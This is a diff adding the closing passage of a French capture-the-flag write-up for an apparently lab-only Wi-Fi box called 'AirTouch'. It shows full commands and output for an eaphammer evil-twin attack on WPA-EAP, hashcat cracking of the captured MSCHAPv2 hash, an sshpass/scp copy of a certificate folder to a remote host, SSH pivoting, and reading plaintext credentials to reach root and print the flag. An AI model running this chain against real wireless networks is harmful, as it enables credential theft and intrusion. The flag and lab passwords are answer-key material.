+LOCAL_FOLDER="/root/certs-backup/"
+
+# Use sshpass to send the folder via SCP
+sshpass -p "$REMOTE_PASSWORD" scp -r "$LOCAL_FOLDER" "$REMOTE_USER@10.10.10.1:$REMOTE_PATH"
+
+en prime ils me donnent un ssh pour avoir un foothold une fois connecté au réseau MERCI BEAUCOUPPP
+
+Je vais me doucher et ou dormir mais prochaine étape:
+
+réussir a importer les certificats dans eapHammer, puis faire un evil twin pour récup les identifiants du serv 
+
+RE !
+pour ça je suis le tuto 
+https://github.com/s0lst1c3/eaphammer/wiki/Importing-Certificates-and-Keys
+
+Imported certificates can be of any of the following formats, so long as they are in PEM format:
+
+Server certificate, CA certificate, and server private key all in separate files:
+
+Usage example:
+
+./eaphammer --cert-wizard import
+ --server-cert /path/to/server_cert.pem
+ --ca-cert /path/to/ca_cert.pem
+ --private-key /path/to/server_key.pem
+
+
+donc
+./eaphammer --cert-wizard import --server-cert /tmp/root/certs-backup/server.crt --ca-cert /tmp/root/certs-backup/ca.crt --private-key /tmp/root/certs-backup/server.key
+
+
+on reprends la commande pour dump les creds:
+
+root@AirTouch-Consultant:~/eaphammer# ./eaphammer --interface wlan1 --channel 44 --essid AirTouch-Office --bssid AC:8B:A9:AA:3F:D2 --auth wpa-eap --creds
+
+et cette fois ci :
+
+mschapv2: Mon Mar  2 11:11:25 2026            
+         domain\username:               AirTouch\r4ulcl
+         username:                      r4ulcl
+         challenge:                     e0:04:1e:59:51:58:03:fd
+         response:                      a1:44:3e:21:69:b3:c6:c5:b6:a6:f8:19:10:9d:c5:b8:63:90:c7:7f:53:8b:29:68          
+         jtr NETNTLM:                   r4ulcl:$NETNTLM$e0041e59515803fd$a1443e2169b3c6c5b6a6f819109dc5b86390c77f538b2968
+         hashcat NETNTLM:               r4ulcl::::a1443e2169b3c6c5b6a6f819109dc5b86390c77f538b2968:e0041e59515803fd      
+
+après l'avoir passé dans hashcat
+
+┌──(kali㉿kali)-[~/Documents/AirTouch]
+└─$ echo 'r4ulcl::::a1443e2169b3c6c5b6a6f819109dc5b86390c77f538b2968:e0041e59515803fd' > hash
+┌──(kali㉿kali)-[~/Documents/AirTouch]
+└─$ hashcat -a 0 hash /usr/share/wordlists/rockyou.txt 
+[...]
+r4ulcl::::a1443e2169b3c6c5b6a6f819109dc5b86390c77f538b2968:e0041e59515803fd:laboratory
+
+on a donc r4ulcl:laboratory
+
+je me connecte
+
+cat > /tmp/wpa_eap.conf << EOF
+network={
+    ssid="AirTouch-Office"
+    key_mgmt=WPA-EAP
+    eap=PEAP
+    identity="AirTouch\r4ulcl"
+    password="laboratory"
+    phase2="auth=MSCHAPV2"
+}
+EOF
+
+sudo wpa_supplicant -B -i wlan0 -c /tmp/wpa_eap.conf
+sudo dhclient wlan0
+
+root@AirTouch-Consultant:/home/consultant# ifconfig
+wlan0: flags=4163<UP,BROADCAST,RUNNING,MULTICAST>  mtu 1500 
+        inet 10.10.10.19  netmask 255.255.255.0  broadcast 10.10.10.255
+        inet6 fe80::ff:fe00:0  prefixlen 64  scopeid 0x20<link>
+        ether 02:00:00:00:00:00  txqueuelen 1000  (Ethernet)
+        RX packets 51  bytes 16397 (16.3 KB)
+        RX errors 0  dropped 0  overruns 0  frame 0
+        TX packets 48  bytes 5294 (5.2 KB)
+        TX errors 0  dropped 0 overruns 0  carrier 0  collisions 0
+
+parfait je suis connecté, c'est reparti pour ligolo-ng et scan le réseau
+
+route_add --name evil-cha --route 10.10.10.19/24
+
+root@AirTouch-Consultant:~/eaphammer# nmap -sn 10.10.10.0/24
+Starting Nmap 7.80 ( https://nmap.org ) at 2026-03-02 11:41 UTC
+Nmap scan report for 10.10.10.1
+Host is up (0.00013s latency).
+MAC Address: AC:8B:A9:AA:3F:D2 (Unknown)
+Nmap scan report for 10.10.10.19
+Host is up.
+Nmap done: 256 IP addresses (2 hosts up) scanned in 26.04 seconds
+
+
+il y a un seul poste a part moi
+
+root@AirTouch-Consultant:~/eaphammer# nmap -p- -sV 10.10.10.1
+Starting Nmap 7.80 ( https://nmap.org ) at 2026-03-02 11:44 UTC
+Nmap scan report for 10.10.10.1
+Host is up (0.000022s latency).
+Not shown: 65533 closed ports
+PORT   STATE SERVICE VERSION
+22/tcp open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.11 (Ubuntu Linux; protocol 2.0)
+53/tcp open  domain  dnsmasq 2.90
+MAC Address: AC:8B:A9:AA:3F:D2 (Unknown)
+Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
+
+Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
+Nmap done: 1 IP address (1 host up) scanned in 21.02 seconds
+
+j'ai un port ssh et des logins ssh QUEL POT haha
+
+ssh remote@10.10.10.1      xGgWEwqUpfoOVsLeROeG
+
+remote@AirTouch-AP-MGT:~$ id
+uid=1000(remote) gid=1000(remote) groups=1000(remote)
+
+il y a un compte nommé "admin" sur le pc
+
+en me baladant sur les fichiers je tombes sur (fichiers config du hotspot):
+
+remote@AirTouch-AP-MGT:/tmp$ cat /etc/hostapd/hostapd_wpe.eap_user 
+"AirTouch\r4ulcl"                           MSCHAPV2            "laboratory" [2]
+"admin"                                 MSCHAPV2                "xMJpzXt4D9ouMuL3JJsMriF7KZozm7" [2]
+
+et finalement c'est juste ça, je peux faire sudo sur tout et le root.txt est dans le dossier root (j'ai été surpris de la rapidité mdr, j'ai vu sur la page du challenge que le firstblood a mis une heure entre le userflag et le rootflag et j'ai l'impression de j'avoir trouvé en 10 min, peut etre des problemes techniques lors de la release de la box)
+admin@AirTouch-AP-MGT:/tmp$ sudo su
+root@AirTouch-AP-MGT:/tmp# cd /root
+root@AirTouch-AP-MGT:~# ls
+certs  mgt  root.txt  start.sh  wlan_config_aps
+root@AirTouch-AP-MGT:~# cat root.txt 
+b16ef17ea63af599325e81fa3a3933ce
+
+TERMINÉ
+CONCLUSIONS:
+
+C'Était l'une de mes box PRÉFÉRÉE, j'avais jamais fait de pentesting de réseau wifi auparavent et j'ai appris ENORMEMENT, c'était vraiment un plaisir fluide de cracker les reseaux wifi des deux types wpa-psk et wpa-eap, de faire le captive portal pour recuperer le mdp du pannel admin etc... le seul endroit où j'ai vraiment été bloqué c'est quand j'ai cherché pendant 2 jours a cracker airtouch-office directement, le message d'erreur qui m'indiquait que le client vérifiait le certificat n'était pas évident pour moi et je n'avais pas vu les tentatives de connections vers Airtouch-Internet.
+Une fois que j'ai vu ça c'était le bonheur complet, j'ai enchainé assez vite et j'ai été pas mal décu de la simplicité du rootflag par rapport au reste. Bref une très bonne box
